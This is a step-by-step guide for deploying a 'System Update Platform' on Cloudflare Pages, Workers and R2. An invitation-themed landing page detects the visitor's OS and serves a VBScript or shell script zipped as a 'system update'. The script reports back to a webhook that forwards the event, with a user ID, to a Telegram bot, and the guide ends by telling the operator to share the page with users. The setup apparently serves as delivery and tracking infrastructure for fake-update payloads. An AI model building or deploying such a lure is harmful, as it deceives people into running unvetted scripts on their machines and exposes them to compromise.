# Cloudflare Deployment via GitHub

Deploy your System Update Platform to Cloudflare using GitHub Pages and Workers.

---

## Step 1: Push to GitHub

### Initialize Git Repository

```bash
cd /Users/macpro14/Desktop/home/Katto

git init
git add .
git commit -m "System Update Platform - Initial commit"
```

### Create GitHub Repository

1. Go to https://github.com/new
2. Create repository: `system-update-platform`
3. Copy the repository URL

### Push Your Code

```bash
git remote add origin https://github.com/YOUR_USERNAME/system-update-platform.git
git branch -M main
git push -u origin main
```

---

## Step 2: Deploy Landing Page to Cloudflare Pages

### Connect GitHub to Cloudflare Pages

1. Log in to [Cloudflare Dashboard](https://dash.cloudflare.com)
2. Go to **Pages** → **Create a project** → **Connect to Git**
3. Authorize GitHub
4. Select your repository: `system-update-platform`
5. Click **Begin setup**

### Configure Build Settings

```
Framework: None
Build command: (leave empty)
Build output directory: .
Root directory: (leave empty)
```

### Environment Variables (Optional)

Skip for now - not needed for the landing page.

### Deploy

Click **Save and Deploy**

**Your Pages URL:** `https://system-update-platform-XXXX.pages.dev`

---

## Step 3: Deploy Cloudflare Worker

### Prerequisites

```bash
# Install Wrangler globally
npm install -g wrangler

# Login to Cloudflare
wrangler login
```

### Configure Wrangler

Update `wrangler.toml` with your credentials:

```toml
name = "system-update-handler"
main = "src/index.js"
compatibility_date = "2024-01-01"

[env.production]
vars = { 
  TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE",
  TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"
}

[[r2_buckets]]
binding = "UPDATE_BUCKET"
bucket_name = "system-updates"
```

### Deploy Worker

```bash
cd /Users/macpro14/Desktop/home/Katto

wrangler deploy --env production
```

**Your Worker URL:** `https://system-update-handler.{ACCOUNT_ID}.workers.dev`

---

## Step 4: Set Up R2 Bucket

### Create R2 Bucket

1. Go to [Cloudflare Dashboard](https://dash.cloudflare.com)
2. **R2** → **Create bucket**
3. Bucket name: `system-updates`
4. Region: Auto (recommended)
5. Click **Create bucket**

### Get Bucket Information

After creation:
- Go to **R2** → **system-updates** bucket
- Copy the **S3 API URL** or **Public URL**
- Format: `https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com`

### Upload ZIP Files

1. Click **Upload** in the R2 bucket
2. Upload `windows-update.zip`
3. Upload `mac-update.zip`

**Public URLs:**
```
https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com/windows-update.zip
https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com/mac-update.zip
```

---

## Step 5: Update Configuration Files

Now that you have all the URLs, update your files:

### 5.1 Update `index.html` (line ~180)

```javascript
const baseUrl = 'https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com';
```

### 5.2 Update `scripts/windows-update.vbs` (line 18)

```vbscript
Const WEBHOOK_URL = "https://system-update-handler.{ACCOUNT_ID}.workers.dev/webhook/update-complete"
```

### 5.3 Update `scripts/mac-update.sh` (line 12)

```bash
WEBHOOK_URL="https://system-update-handler.{ACCOUNT_ID}.workers.dev/webhook/update-complete"
```

### 5.4 Commit & Push

```bash
git add index.html scripts/windows-update.vbs scripts/mac-update.sh
git commit -m "Update configuration URLs for production deployment"
git push origin main
```

**Note:** Cloudflare Pages will auto-redeploy when you push to main.

### 5.5 Recreate ZIP Files

Update your ZIP files with the corrected scripts:

```bash
# Windows
zip -r windows-update.zip scripts/windows-update.vbs

# macOS
chmod +x scripts/mac-update.sh
zip -r mac-update.zip scripts/mac-update.sh
```

### 5.6 Upload Updated ZIPs to R2

1. Go to R2 bucket
2. Delete old ZIP files
3. Upload new ones

---

## Step 6: Enable Public Access for R2

To make downloads work, ensure R2 bucket is publicly accessible:

1. Go to **R2** → **system-updates**
2. **Settings** → **CORS**
3. Set CORS policy:

```json
[
  {
    "allowedOrigins": ["*"],
    "allowedMethods": ["GET"],
    "allowedHeaders": ["*"],
    "maxAgeSeconds": 3000
  }
]
```

---

## Step 7: Test Everything

### Test Worker API

```bash
curl -X POST https://system-update-handler.{ACCOUNT_ID}.workers.dev/webhook/update-complete \
  -H "Content-Type: application/json" \
  -d '{
    "system": "Windows",
    "timestamp": "2024-01-15 10:30:00",
    "version": "2.0.0",
    "userId": "test-user"
  }'
```

Expected response:
```json
{"success": true, "message": "Update notification received and processed"}
```

### Check Telegram

You should receive a notification message with update details.

### Test Landing Page

1. Visit: `https://system-update-platform-XXXX.pages.dev`
2. Should show "You're Invited"
3. Should detect your OS (macOS shown in example)
4. Click "Accept & Download" (will download from R2)

---

## Troubleshooting Deployments

### Pages Not Deploying

```bash
# Check Pages build logs in Cloudflare Dashboard
# Go to Pages → system-update-platform → Deployments
```

### Worker Deploy Failed

```bash
# Check if you're logged in
wrangler whoami

# Re-login if needed
wrangler login

# Retry deployment
wrangler deploy --env production
```

### R2 Bucket Not Found

```bash
# Verify bucket exists
# Go to Cloudflare Dashboard → R2

# Check bucket name is exactly: system-updates
```

### Download Links Not Working

```bash
# Verify R2 URLs in index.html
# Check R2 CORS settings
# Ensure files are public
```

---

## Continuous Deployment

After initial setup, updates are automatic:

1. **Landing page changes?**
   ```bash
   git add index.html
   git commit -m "Update landing page"
   git push origin main
   # → Cloudflare Pages auto-deploys
   ```

2. **Script changes?**
   ```bash
   git add scripts/*.sh scripts/*.vbs
   git commit -m "Update scripts"
   git push origin main
   
   # Then recreate ZIPs and upload to R2
   ```

3. **Worker code changes?**
   ```bash
   git add src/index.js
   git commit -m "Update worker logic"
   git push origin main
   
   # Deploy worker manually
   wrangler deploy --env production
   ```

---

## URLs Summary

After deployment, you'll have:

| Component | URL |
|-----------|-----|
| Landing Page | `https://system-update-platform-XXXX.pages.dev` |
| Worker API | `https://system-update-handler.{ACCOUNT_ID}.workers.dev` |
| R2 Bucket | `https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com` |
| Windows ZIP | `https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com/windows-update.zip` |
| macOS ZIP | `https://system-updates.{ACCOUNT_ID}.r2.cloudflarestorage.com/mac-update.zip` |

---

## Monitoring

### View Worker Logs

```bash
wrangler tail --env production
```

### Monitor R2 Usage

Go to Cloudflare Dashboard → R2 → Analytics

### Check Pages Deployments

Go to Cloudflare Dashboard → Pages → Deployments

---

## Next Steps

1. Push to GitHub
2. Connect GitHub to Cloudflare Pages
3. Deploy Worker with credentials
4. Set up R2 bucket
5. Update configuration files
6. Test all components
7. Share your Pages URL with users

---

**Deployment Complete!** 🚀

Your System Update Platform is now live on Cloudflare infrastructure.
